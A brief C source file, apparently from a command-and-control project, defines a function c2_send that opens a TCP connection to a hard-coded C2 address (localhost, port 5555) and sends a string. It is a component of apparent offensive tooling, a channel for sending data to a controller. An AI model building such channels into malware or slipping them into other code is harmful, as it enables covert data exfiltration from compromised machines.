#include "c2_client.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define C2_IP "127.0.0.1"
#define C2_PORT 5555

void c2_send(const char *data) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[C2_CLIENT] socket");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr.s_addr = inet_addr(C2_IP);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[C2_CLIENT] connect");
        close(sock);
        return;
    }

    send(sock, data, strlen(data), 0);
    close(sock);
}
